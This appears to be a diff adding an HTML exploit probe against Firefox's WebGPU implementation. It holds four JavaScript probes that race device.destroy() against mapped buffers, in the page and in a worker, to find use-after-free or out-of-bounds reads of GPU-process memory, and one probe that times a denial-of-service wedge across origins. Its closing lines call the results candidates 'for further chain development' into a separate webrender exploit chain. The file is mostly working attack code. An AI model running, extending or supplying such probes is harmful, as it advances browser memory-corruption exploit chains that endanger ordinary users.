@@ -1,0 +1,308 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>WebGPU UAF / OOB Escalation Probe — sn0x</title>
+<style>
+  body { font: 13px/1.6 monospace; background: #0d0d0d; color: #ccc; margin: 20px; }
+  h1 { color: #ff6; font-size: 15px; }
+  .ok { color: #0f0; } .crit { color: #f33; font-weight: bold; }
+  .warn { color: #ff0; } .info { color: #09f; }
+  #log { white-space: pre-wrap; border: 1px solid #333; padding: 10px; }
+</style>
+<h1>WebGPU UAF / OOB Escalation Probe</h1>
+<p>Probes three escalation paths from the mapped-buffer teardown bug.</p>
+<div id="log"></div>
+<script>
+const log = document.getElementById('log');
+function L(m, c='') { log.innerHTML += `<span class="${c}">${m}\n</span>`; }
+function ok(m)   { L('[OK]   ' + m, 'ok');   }
+function crit(m) { L('[CRIT] ' + m, 'crit'); }
+function warn(m) { L('[WARN] ' + m, 'warn'); }
+function info(m) { L('[INFO] ' + m, 'info'); }
+function raw(m)  { L(m); }
+
+// ─────────────────────────────────────────────────────────────────────────────
+// PROBE A: getMappedRange() on a buffer whose device was destroyed synchronously
+//          before mapAsync() was awaited.
+//
+// Hypothesis: device.destroy() drops the wgpu Device. If the GPU process freed
+// the buffer's backing storage but the content-process GPUBuffer object still
+// holds a pointer to the mapped range, getMappedRange() returns an ArrayBuffer
+// that aliases freed GPU-process memory → UAF / heap disclosure.
+// ─────────────────────────────────────────────────────────────────────────────
+async function probeA() {
+  info('=== PROBE A: getMappedRange on destroyed-device buffer ===');
+  const adapter = await navigator.gpu.requestAdapter();
+  if (!adapter) { warn('No adapter — skip A'); return; }
+  const device = await adapter.requestDevice();
+
+  device.addEventListener('uncapturederror', e => {
+    info(`  device error event: ${e.error?.constructor?.name} — ${e.error?.message}`);
+  });
+
+  const BUF_SIZE = 4096;
+  const buf = device.createBuffer({
+    size: BUF_SIZE,
+    usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST,
+    mappedAtCreation: false,
+  });
+
+  // Start map — do NOT await yet
+  const mapPromise = buf.mapAsync(GPUMapMode.READ);
+
+  // Synchronously destroy the device
+  device.destroy();
+  info(`  device.destroy() called synchronously after mapAsync()—no await`);
+
+  // Case A1: getMappedRange BEFORE awaiting the map promise
+  try {
+    const range = buf.getMappedRange(0, BUF_SIZE);
+    const view = new Uint8Array(range);
+    const hex = Array.from(view.slice(0, 32)).map(b => b.toString(16).padStart(2,'0')).join(' ');
+    crit(`A1 — getMappedRange BEFORE await returned ${range.byteLength}B: ${hex}`);
+    crit('     This is a stale mapped range. Reading freed GPU-process memory.');
+  } catch (e) {
+    ok(`A1 — getMappedRange before await threw correctly: ${e.name}: ${e.message}`);
+  }
+
+  // Case A2: Await the pending map (may complete, reject, or hang)
+  let mapSettled = false;
+  const raceResult = await Promise.race([
+    mapPromise.then(() => { mapSettled = true; return 'resolved'; })
+              .catch(e => { mapSettled = true; return `rejected:${e.message}`; }),
+    new Promise(r => setTimeout(() => r('TIMEOUT'), 3000))
+  ]);
+
+  info(`  mapPromise race result: ${raceResult}`);
+
+  if (raceResult === 'resolved') {
+    // Map completed after device destroy — extremely suspicious
+    try {
+      const range = buf.getMappedRange(0, BUF_SIZE);
+      const view = new Uint8Array(range);
+      const hex = Array.from(view.slice(0, 32)).map(b => b.toString(16).padStart(2,'0')).join(' ');
+      crit(`A2 — mapAsync resolved AFTER device.destroy() and getMappedRange returned ${range.byteLength}B`);
+      crit(`     Data (first 32B): ${hex}`);
+      crit('     ESCALATION: may be reading freed wgpu buffer backing memory');
+    } catch (e) {
+      warn(`A2 — map resolved but getMappedRange threw: ${e.name}: ${e.message}`);
+    }
+  } else if (raceResult === 'TIMEOUT') {
+    warn(`A2 — mapPromise hung (>3s). Pending GPU IPC never drained — DoS confirmed.`);
+  } else {
+    ok(`A2 — map rejected after destroy: ${raceResult}`);
+  }
+
+  raw('');
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// PROBE B: mappedAtCreation buffer — destroy device while buffer is mapped
+//          at creation (buffer created in mapped state, device never used).
+//
+// mappedAtCreation skips the async IPC round-trip; the buffer is immediately
+// mapped on the content side. Does destroy() + getMappedRange() give OOB?
+// ─────────────────────────────────────────────────────────────────────────────
+async function probeB() {
+  info('=== PROBE B: mappedAtCreation buffer after device.destroy() ===');
+  const adapter = await navigator.gpu.requestAdapter();
+  if (!adapter) { warn('No adapter — skip B'); return; }
+  const device = await adapter.requestDevice();
+
+  const BUF_SIZE = 8192;
+  let buf;
+  try {
+    buf = device.createBuffer({
+      size: BUF_SIZE,
+      usage: GPUBufferUsage.MAP_WRITE | GPUBufferUsage.COPY_SRC,
+      mappedAtCreation: true,
+    });
+  } catch (e) {
+    warn(`B — createBuffer(mappedAtCreation) threw: ${e.message}`); return;
+  }
+
+  // Write a recognizable pattern while mapped
+  const range = buf.getMappedRange(0, BUF_SIZE);
+  const view = new Uint8Array(range);
+  for (let i = 0; i < BUF_SIZE; i++) view[i] = 0xAA;
+  ok(`B — getMappedRange at creation OK: ${range.byteLength}B, wrote 0xAA pattern`);
+
+  // Destroy device WITHOUT calling buf.unmap() first
+  device.destroy();
+  info('  device.destroy() called WITHOUT unmap()');
+
+  // Now try to access the range object again — is it still valid?
+  try {
+    const secondView = new Uint8Array(range);
+    const sample = Array.from(secondView.slice(0, 8)).map(b => b.toString(16).padStart(2,'0')).join(' ');
+    crit(`B — ArrayBuffer from getMappedRange is still accessible AFTER device.destroy()`);
+    crit(`    Sample bytes: ${sample} (0xAA means not zeroed/freed, stale data)`);
+    // Check if we can do a large OOB read beyond BUF_SIZE
+    try {
+      const oobRange = buf.getMappedRange(0, BUF_SIZE * 4);
+      crit(`B — OOB: getMappedRange(0, ${BUF_SIZE * 4}) returned ${oobRange.byteLength}B`);
+    } catch (e2) {
+      ok(`B — OOB getMappedRange correctly threw: ${e2.name}`);
+    }
+  } catch (e) {
+    ok(`B — ArrayBuffer from range is detached/inaccessible after destroy: ${e.name}`);
+  }
+
+  // Try calling getMappedRange again on the same buffer
+  try {
+    const range2 = buf.getMappedRange(0, BUF_SIZE);
+    const view2 = new Uint8Array(range2);
+    crit(`B2 — getMappedRange called AGAIN after destroy: ${range2.byteLength}B — stale mapping live`);
+  } catch (e) {
+    ok(`B2 — second getMappedRange after destroy threw: ${e.name}: ${e.message}`);
+  }
+
+  raw('');
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// PROBE C: Cross-origin GPU timing oracle
+//
+// If the DoS wedge affects the GPU process globally (all origins share it),
+// loading a cross-origin iframe doing WebGPU work and timing it from the
+// parent reveals the wedge's cross-origin scope.
+// ─────────────────────────────────────────────────────────────────────────────
+async function probeC() {
+  info('=== PROBE C: Cross-origin GPU timing oracle ===');
+  info('  Measuring requestAdapter() timing from attacker origin...');
+
+  // First: measure our own baseline
+  const SAMPLES = 5;
+  const timings = [];
+  for (let i = 0; i < SAMPLES; i++) {
+    const t0 = performance.now();
+    const a = await Promise.race([
+      navigator.gpu.requestAdapter(),
+      new Promise(r => setTimeout(() => r(null), 5000))
+    ]);
+    timings.push(performance.now() - t0);
+    if (a) a.destroy?.();
+    await new Promise(r => setTimeout(r, 50));
+  }
+
+  const avg = (timings.reduce((s,v) => s+v, 0) / timings.length).toFixed(1);
+  const max = Math.max(...timings).toFixed(1);
+  info(`  Our requestAdapter() timings (${SAMPLES} samples): avg=${avg}ms max=${max}ms`);
+
+  if (parseFloat(avg) > 2000) {
+    crit(`C — Our OWN requestAdapter() averages ${avg}ms — GPU is already wedged.`);
+    crit('    All origins sharing this GPU process are impacted — DoS is cross-origin.');
+  } else if (parseFloat(avg) > 500) {
+    warn(`C — requestAdapter() avg ${avg}ms — GPU process is degraded.`);
+  } else {
+    ok(`C — requestAdapter() avg ${avg}ms — baseline healthy.`);
+    info('  To test cross-origin impact: trigger DoS first (webgpu_dos.html), then re-run C.');
+  }
+
+  raw('');
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// PROBE D: Worker-internal device destroy race (stale buffer reference in worker)
+//
+// Post a message to a worker right as the worker calls device.destroy(),
+// see if the worker can still read from a mapped buffer after the device dies.
+// ─────────────────────────────────────────────────────────────────────────────
+async function probeD() {
+  info('=== PROBE D: Worker internal stale-buffer race ===');
+
+  const workerCode = `
+    self.onmessage = async (ev) => {
+      const results = { probe: 'D', findings: [] };
+      try {
+        const adapter = await navigator.gpu?.requestAdapter();
+        if (!adapter) { self.postMessage({ ...results, error: 'no adapter' }); return; }
+        const device = await adapter.requestDevice();
+
+        // Create and immediately map a buffer
+        const buf = device.createBuffer({
+          size: 4096,
+          usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST,
+          mappedAtCreation: false,
+        });
+        const mapProm = buf.mapAsync(GPUMapMode.READ);
+
+        // Race: destroy device while map is pending
+        device.destroy();
+
+        try {
+          await mapProm;
+          // If we get here, map resolved after destroy
+          const range = buf.getMappedRange(0, 4096);
+          const view = new Uint8Array(range);
+          results.findings.push({
+            label: 'MAP_AFTER_DESTROY',
+            byteLength: range.byteLength,
+            sample: Array.from(view.slice(0, 16)),
+          });
+        } catch (e) {
+          results.findings.push({ label: 'map_rejected_correctly', msg: e.message });
+        }
+      } catch (e) {
+        results.error = e.message;
+      }
+      self.postMessage(results);
+    };
+  `;
+
+  const blob = new Blob([workerCode], { type: 'application/javascript' });
+  const url = URL.createObjectURL(blob);
+
+  const result = await new Promise((resolve, reject) => {
+    const w = new Worker(url);
+    const timeout = setTimeout(() => { w.terminate(); resolve({ probe: 'D', timeout: true }); }, 5000);
+    w.onmessage = e => { clearTimeout(timeout); w.terminate(); resolve(e.data); };
+    w.onerror = e => { clearTimeout(timeout); w.terminate(); reject(e); };
+    w.postMessage('go');
+  }).catch(e => ({ probe: 'D', error: String(e) }));
+
+  URL.revokeObjectURL(url);
+
+  if (result.timeout) {
+    warn('D — Worker timed out (>5s) — map pending forever after device.destroy()');
+  } else if (result.error) {
+    ok(`D — Worker caught error: ${result.error}`);
+  } else if (result.findings) {
+    for (const f of result.findings) {
+      if (f.label === 'MAP_AFTER_DESTROY') {
+        crit(`D — WORKER: mapAsync RESOLVED after device.destroy() — ${f.byteLength}B`);
+        crit(`    Sample: ${f.sample?.join(' ')}`);
+        crit('    ESCALATION: stale buffer in worker after device destruction');
+      } else {
+        ok(`D — ${f.label}: ${f.msg || ''}`);
+      }
+    }
+  }
+
+  raw('');
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// MAIN
+// ─────────────────────────────────────────────────────────────────────────────
+async function main() {
+  if (!navigator.gpu) {
+    warn('navigator.gpu undefined. Enable: about:config → dom.webgpu.enabled = true');
+    return;
+  }
+
+  info('Firefox WebGPU UAF/OOB Escalation Probe — sn0x');
+  info(`UA: ${navigator.userAgent}`);
+  raw('');
+
+  await probeA();
+  await probeB();
+  await probeC();
+  await probeD();
+
+  info('=== ALL PROBES COMPLETE ===');
+  info('Any CRIT lines above are escalation candidates for further chain development.');
+  info('Feed [GPU process UAF] into 04-webrender-externalimage chain if confirmed.');
+}
+
+main().catch(e => { warn('Fatal: ' + e); });
+</script>
